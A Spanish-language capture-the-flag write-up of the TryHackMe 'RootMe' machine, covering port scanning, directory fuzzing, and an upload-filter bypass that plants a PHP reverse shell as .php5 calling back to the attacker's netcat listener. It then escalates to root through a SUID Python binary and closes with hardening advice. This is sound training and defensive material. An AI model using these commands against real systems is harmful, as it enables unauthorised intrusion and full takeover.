# Informe de Auditoría y Writeup: Desafío "RootMe" (TryHackMe) 

---

## 1. Objetivo del Laboratorio

Este documento detalla el proceso técnico realizado para resolver la máquina "RootMe" en TryHackMe. La auditoría consistió en una prueba de penetración en modalidad de caja negra (Black-Box) dirigida a la IP objetivo (`10.65.147.166`). 

El ejercicio abarca desde la configuración de un entorno virtualizado propio (Kali Linux vía VPN) y el escaneo de red, hasta la explotación de una vulnerabilidad de subida de archivos sin restricciones (*Unrestricted File Upload*). Finalmente, se logró la escalada de privilegios a través de un binario mal configurado con permisos SUID. Además, se proponen medidas de fortificación (*hardening*) para mitigar estas vulnerabilidades.

> **Nota:** Para respetar las reglas de la plataforma y mantener las buenas prácticas éticas, las flags (`user.txt` y `root.txt`) han sido truncadas (`[REDACTED]`) en este repositorio público.

---

## 2. Herramientas Utilizadas

| Herramienta | Propósito en el Pentest |
| :--- | :--- |
| **VirtualBox + Kali Linux** | Entorno de ataque independiente, evitando el uso de la AttackBox web. |
| **OpenVPN** | Establecimiento de un túnel cifrado (`tun0`) hacia la red de TryHackMe. |
| **Nmap** | Escaneo de puertos TCP, enumeración de servicios y detección de versiones. |
| **Gobuster** | *Fuzzing* de directorios para encontrar rutas ocultas en el servidor web. |
| **PHP Reverse Shell** | Script de *pentestmonkey* utilizado como payload para obtener acceso remoto. |
| **Netcat (nc)** | Configuración de un *listener* para recibir la conexión de la consola inversa. |
| **Python & Find** | Búsqueda de binarios SUID, estabilización de la terminal (TTY) y explotación. |

---

## 3. Metodología y Explotación Paso a Paso

### Etapa 0: Conexión al Entorno (VPN)
En lugar de utilizar las herramientas del navegador, se optó por un entorno propio desplegando una VM con Kali Linux. La conexión a la red privada se estableció con las credenciales proporcionadas:

```bash
# Iniciamos OpenVPN en segundo plano con privilegios de superusuario
sudo openvpn perfil_tryhackme.ovpn

# Verificamos la IP asignada en nuestra interfaz de túnel (tun0/tun1)
ip -4 a show tun0
```
*(IP Atacante asignada para este lab: 192.168.131.47)*

### Etapa 1: Reconocimiento Activo (Nmap)
El primer paso fue descubrir qué servicios estaban expuestos en la máquina víctima. Se ejecutó un escaneo con Nmap omitiendo el descubrimiento de hosts (`-Pn`), detectando versiones (`-sV`) y usando scripts por defecto (`-sC`):

```bash
nmap -sC -sV -Pn 10.65.147.166 -oN nmap_rootme.txt
```

**Resultados clave:**
*   **Puerto 22/tcp (OPEN):** `OpenSSH 8.2p1 Ubuntu` (Ignorado temporalmente por falta de credenciales).
*   **Puerto 80/tcp (OPEN):** `Apache httpd 2.4.41 (Ubuntu)`. Este será nuestro vector de entrada inicial.

### Etapa 2: Enumeración Web (Gobuster)
Al visitar `http://10.65.147.166`, solo encontramos una página estática. Para descubrir contenido oculto, realizamos un ataque de fuerza bruta a los directorios web:

```bash
gobuster dir -u http://10.65.147.166/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -o gobuster_rootme.txt
```

**Hallazgos importantes:**
*   `/panel/`: Un directorio oculto que contiene un formulario de subida de archivos.
*   `/uploads/`: Directorio donde se almacenan los archivos cargados a través del panel.

### Etapa 3: Explotación Web y Bypass de Filtros
Inicialmente, intentamos subir una *Reverse Shell* estándar en formato `.php`. Sin embargo, el servidor implementaba una **lista negra** (blacklist) que bloqueaba esta extensión específica.

Para evadir esta restricción (Bypass), renombramos nuestro payload de PHP, utilizando una extensión alternativa válida para servidores Apache mal configurados:

```bash
# Copiamos la reverse shell local y cambiamos la extensión a .php5
cp /usr/share/webshells/php/php-reverse-shell.php shell.php5

# Editamos el archivo para incluir nuestra IP de atacante y puerto
nano shell.php5 
# Configuramos: $ip = '192.168.131.47'; y $port = 1234;
```

Al subir `shell.php5`, el servidor lo aceptó exitosamente.

### Etapa 4: Reverse Shell y Estabilización (TTY)
Antes de ejecutar el archivo en el servidor web, preparamos un *listener* en nuestra máquina atacante:

```bash
nc -lvnp 1234
```

Navegamos a `http://10.65.147.166/uploads/shell.php5` y obtuvimos una conexión exitosa como el usuario `www-data`. Dado que la terminal inicial era inestable, la mejoramos usando Python:

```bash
# Estabilización de la shell
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Búsqueda de la primera flag (user.txt) ignorando errores de permisos
find / -type f -name user.txt 2>/dev/null
cat /var/www/user.txt
# Resultado: THM{... [REDACTED]}
```

### Etapa 5: Escalada de Privilegios a Root
Con acceso limitado, el siguiente objetivo fue comprometer el sistema completo buscando binarios con el bit **SUID** activado (archivos que se ejecutan con los permisos de su propietario, en este caso, root):

```bash
find / -user root -perm -4000 2>/dev/null
```

Entre los resultados destacó `/usr/bin/python`. Que un intérprete de lenguajes tenga permisos SUID es una vulnerabilidad crítica. Consultando *GTFOBins*, ejecutamos el siguiente comando para escalar privilegios:

```bash
# Ejecutamos una shell interactiva manteniendo los privilegios (flag -p)
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

whoami && id
# root
# uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)

cat /root/root.txt
# Resultado: THM{pr1v1... [REDACTED]}
```
Máquina comprometida al 100%.

---

## 4. Análisis de Vulnerabilidades

| # | Vulnerabilidad | Severidad / CWE | Causa Raíz | Impacto Potencial |
| :--- | :--- | :--- | :--- | :--- |
| 1 | **Unrestricted File Upload** | Crítica (CWE-434) | Filtro basado en lista negra incompleta (solo bloquea `.php`, no `.php5`). No valida Magic Bytes. | Ejecución Remota de Código (RCE). Permite tomar control del servidor web. |
| 2 | **Directorios sin Autenticación** | Alta (CWE-284) | Seguridad por oscuridad. Confiar en que no enlazar `/panel/` lo hace seguro. | Un atacante puede descubrir el portal mediante *fuzzing* y subir payloads. |
| 3 | **Configuración SUID Insegura** | Crítica (CWE-250) | Permisos SUID (`chmod u+s`) asignados incorrectamente al binario de Python. | Escalada de privilegios trivial; cualquier usuario básico puede convertirse en Root. |
| 4 | **Exposición de Versiones** | Baja (CWE-200) | `ServerTokens` y `ServerSignature` activos por defecto en Apache. | Facilita la búsqueda de *exploits* específicos para esa versión del servicio. |

---

## 5. Propuestas de Remediación (Hardening)

Para asegurar este servidor en un entorno de producción, se recomiendan las siguientes acciones basadas en el principio de mínimo privilegio:

1. **Parcheo de Subida de Archivos:**
   - Reemplazar la lista negra por una **lista blanca (whitelist)** estricta (ej. solo permitir `.jpg`, `.png`).
   - Validar el contenido real del archivo comprobando los *Magic Bytes* (ej. mediante `finfo_file()` en PHP).
   - Renombrar los archivos subidos utilizando hashes o UUIDs para evitar ejecuciones directas.

2. **Asegurar el Directorio de Uploads:**
   - Modificar la configuración de Apache para impedir la ejecución de scripts en la carpeta `/uploads/`:
     ```apache
     <Directory "/var/www/html/uploads">
         php_admin_flag engine off
         Options -Indexes
     </Directory>
     ```

3. **Revocar Permisos SUID Inseguros:**
   - Quitar el bit SUID del intérprete de Python inmediatamente:
     ```bash
     sudo chmod u-s /usr/bin/python2.7
     ```

4. **Ocultamiento de Banners:**
   - En `/etc/apache2/conf-available/security.conf`, configurar:
     ```apache
     ServerTokens Prod
     ServerSignature Off
     ```

---

## 6. Conclusiones y Aprendizajes

Este laboratorio demostró claramente que **la seguridad por oscuridad no es seguridad**. Ocultar un directorio administrativo (`/panel/`) no impide que un atacante lo encuentre mediante diccionarios y escáneres. 

Asimismo, se evidenció por qué las "listas negras" (blacklists) son un enfoque deficiente para proteger la carga de archivos; los atacantes siempre encontrarán extensiones alternativas (`.php5`, `.phtml`). Finalmente, la escalada de privilegios subrayó el peligro crítico de asignar el bit SUID a intérpretes de comandos o lenguajes de programación, permitiendo que una vulnerabilidad inicial a nivel de aplicación (RCE web) escale a un compromiso total del sistema (Root) en cuestión de segundos.
